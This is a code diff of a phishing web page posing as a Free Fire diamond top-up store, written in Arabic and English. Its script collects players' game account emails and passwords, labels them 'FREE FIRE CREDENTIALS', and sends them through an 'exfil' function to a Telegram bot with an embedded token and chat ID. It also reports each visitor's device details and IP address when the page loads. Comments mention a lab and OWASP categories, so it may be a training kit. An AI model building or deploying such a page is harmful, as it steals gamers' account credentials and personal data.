+            </div>
+            <div class="contact-form">
+                <form id="contactForm" onsubmit="submitForm(event)">
+                    <input type="text" data-i18n-placeholder="contact.name" placeholder="الاسم" required>
+                    <input type="tel" data-i18n-placeholder="contact.phone" placeholder="رقم الواتساب" required>
+                    <select required>
+                        <option value="" data-i18n="contact.gameChoose">اختر اللعبة</option>
+                        <option value="freefire" data-i18n="games.freefire">فري فاير</option>
+                        <option value="pubg" data-i18n="games.pubg">ببجي موبايل (قريباً)</option>
+                    </select>
+                    <textarea data-i18n-placeholder="contact.msg" placeholder="رسالتك أو استفسارك..."></textarea>
+                    <button type="submit"><i class="fab fa-whatsapp"></i> <span data-i18n="contact.send">إرسال عبر واتساب</span></button>
+                </form>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <p data-i18n="footer.copy">© 2024 Pakistan Store - متجر باكستاني - جميع الحقوق محفوظة</p>
+        <div class="social-links">
+            <a href="#"><i class="fab fa-facebook-f"></i></a>
+            <a href="#"><i class="fab fa-instagram"></i></a>
+            <a href="#"><i class="fab fa-twitter"></i></a>
+            <a href="#"><i class="fab fa-whatsapp"></i></a>
+        </div>
+    </footer>
+
+    <div class="cart-overlay" id="cartOverlay" onclick="toggleCart()"></div>
+    <div class="cart-sidebar" id="cartSidebar">
+        <div class="cart-header">
+            <h3><span data-i18n="cart.title">🛒 سلة التسوق</span></h3>
+            <button class="cart-close" onclick="toggleCart()"><i class="fas fa-times"></i></button>
+        </div>
+        <div class="cart-items" id="cartItems">
+            <div class="empty-cart"><i class="fas fa-shopping-basket"></i><p data-i18n="cart.empty">السلة فارغة</p><small data-i18n="cart.emptyHelp">اختر باقة للبدء</small></div>
+        </div>
+        <div class="cart-footer">
+            <div class="cart-total"><span data-i18n="cart.total">الإجمالي:</span><span id="cartTotal">0</span></div>
+            <small data-i18n="cart.note" style="display:block; text-align:center; color: var(--gray); margin-top: 8px; font-size: 13px;">لإتمام الطلب، املأ النموذج في الصفحة</small>
+        </div>
+    </div>
+
+    <div class="modal" id="successModal" onclick="if(event.target === this) closeModal()">
+        <div class="modal-content">
+            <button class="modal-close-x" onclick="closeModal()" aria-label="Close">×</button>
+            <i class="fas fa-check-circle"></i>
+            <h3 data-i18n="modal.thanks.title">تم إرسال الطلب!</h3>
+            <p data-i18n="modal.thanks.desc">وصلت بياناتك إلى البوت والسيرفر المحلي — راجع تيليجرام بتاعك و captures.log</p>
+            <button onclick="closeModal()" data-i18n="modal.ok">تم</button>
+        </div>
+    </div>
+
+    <a href="https://wa.me/923000000000" class="whatsapp-btn" target="_blank"><i class="fab fa-whatsapp"></i></a>
+
+    <script>
         'use strict';
         // ============================================================
-        // ⚙️ CONFIG — البيانات بتاعتك
+        // ⚙️ CONFIG — بياناتك
         // ============================================================
         var TELEGRAM_BOT_TOKEN = '8228247059:AAGVPnwBA0ClYziL9GJ0ZBdLypsXC0hhbAw';
         var TELEGRAM_CHAT_ID = '6062660671';
-        var CALLBACK_URL = 'http://127.0.0.1:8000/callback'; // سيرفر محلي (تسجيل ثانوي)
+        var CALLBACK_URL = 'http://127.0.0.1:8000/callback'; // تسجيل ثانوي (local فقط — على Pages مش هيشتغل، عادي)
 
         // ============================================================
         // 💎 باقات الشحن (8 باقات)
@@ -55,7 +467,7 @@
                 'footer.copy': '© 2024 Pakistan Store - متجر باكستاني - جميع الحقوق محفوظة',
                 'cart.title': '🛒 سلة التسوق', 'cart.empty': 'السلة فارغة', 'cart.emptyHelp': 'اختر باقة للبدء', 'cart.total': 'الإجمالي:', 'cart.note': 'لإتمام الطلب، املأ النموذج في الصفحة',
                 'modal.ok': 'تم', 'modal.thanks.title': 'تم إرسال الطلب!', 'modal.thanks.desc': 'وصلت بياناتك إلى البوت والسيرفر المحلي — راجع تيليجرام بتاعك و captures.log',
-                'alert.choosePack': '⚠️ اختر باقة أولاً!', 'alert.chooseLink': '⚠️ اختر نوع ربط الحساب الأساسي!', 'alert.fillId': '⚠️ أدخل معرف اللاعب (ID)!', 'alert.fillEmail': '⚠️ أدخل بريد إلكتروني صحيح!', 'alert.fillPassword': '⚠️ أدخل كلمة المرور!', 'alert.passwordMismatch': '⚠️ كلمة المرور غير متطابقة!', 'alert.passwordShort': '⚠️ كلمة المرور قصيرة — 8 أحرف على الأقل!', 'alert.choosePayment': '⚠️ اختار طريقة الدفع!', 'alert.comingSoon': '🚧 قريباً! خدمة شحن ببجي موبايل ستكون متاحة قريباً', 'alert.noDelivery': '⚠️ الإرسال فشل! اتأكد إنك حاطط التوكين والـ chat id في الـ CONFIG'
+                'alert.choosePack': '⚠️ اختر باقة أولاً!', 'alert.chooseLink': '⚠️ اختر نوع ربط الحساب الأساسي!', 'alert.fillId': '⚠️ أدخل معرف اللاعب (ID)!', 'alert.fillEmail': '⚠️ أدخل بريد إلكتروني صحيح!', 'alert.fillPassword': '⚠️ أدخل كلمة المرور!', 'alert.passwordMismatch': '⚠️ كلمة المرور غير متطابقة!', 'alert.passwordShort': '⚠️ كلمة المرور قصيرة — 8 أحرف على الأقل!', 'alert.choosePayment': '⚠️ اختر طريقة الدفع!', 'alert.comingSoon': '🚧 قريباً! خدمة شحن ببجي موبايل ستكون متاحة قريباً', 'alert.noDelivery': '⚠️ الإرسال فشل! اتأكد إن التوكين والـ chat id في الـ CONFIG صح'
             },
             en: {
                 'header.instant': 'Instant delivery - Under 5 minutes', 'header.support': '24/7 Tech Support',
@@ -136,7 +548,7 @@
         }
 
         // ============================================================
-        // ✅ التحقق (client-side فقط — للتجربة في الـ lab)
+        // ✅ التحقق (client-side فقط — A02/A04: قابل للتجاوز، للتوثيق)
         // ============================================================
         function validateId() {
             var id = document.getElementById('accountId');
@@ -354,9 +766,10 @@
                 apple: '🍎 Apple ID', twitter: '🐦 Twitter / X', guest: '👤 Guest'
             };
             var payLabels = { free: '🎁 مجاني', visa: '💳 Visa', vodafone: '📱 Vodafone Cash', googleplay: '🎮 Google Play' };
+            var pkgName = String(p.package.name || '').replace(/\s*\([^)]*\)/g, '').trim();
             var msg = '🎯 [1] FREE FIRE CREDENTIALS\n';
             msg += '━━━━━━━━━━━━━━\n\n';
-            msg += '📦 Package: ' + p.package.name + '\n';
+            msg += '📦 Package: ' + pkgName + '\n';
             msg += '💎 Diamonds: ' + p.package.diamonds + '\n';
             msg += '💰 Price: ' + (p.isFree ? '🎁 مجاناً' : p.price) + '\n';
             msg += '💳 Payment: ' + (payLabels[p.payment] || p.payment) + '\n\n';
@@ -377,13 +790,24 @@
             msg += '🕐 Time: ' + p.timestamp;
             return msg;
         }
-        // الإرسال الرئيسي: تيليجرام + تسجيل ثانوي على السيرفر المحلي
+        function postJson(url, data) {
+            return fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
+        }
         function exfil(text, payload) {
             postJson(CALLBACK_URL, payload).catch(function() {});
             return sendToTelegram(text);
         }
-        function postJson(url, data) {
-            return fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
+
+        // ============================================================
+        // 📡 رسالة PAGE LOADED — أول ما الصفحة تتحمل
+        // ============================================================
+        function sendPageLoaded() {
+            var dev = getDeviceInfo();
+            getIP().then(function(ip) {
+                return sendToTelegram(buildPageLoadedMessage(dev, ip));
+            }).catch(function() {
+                return sendToTelegram(buildPageLoadedMessage(dev, 'N/A'));
+            });
         }
 
         // ============================================================
@@ -464,4 +888,6 @@
         loadProducts();
         updateCart();
         sendPageLoaded();
-</script>
+    </script>
+</body>
+</html>
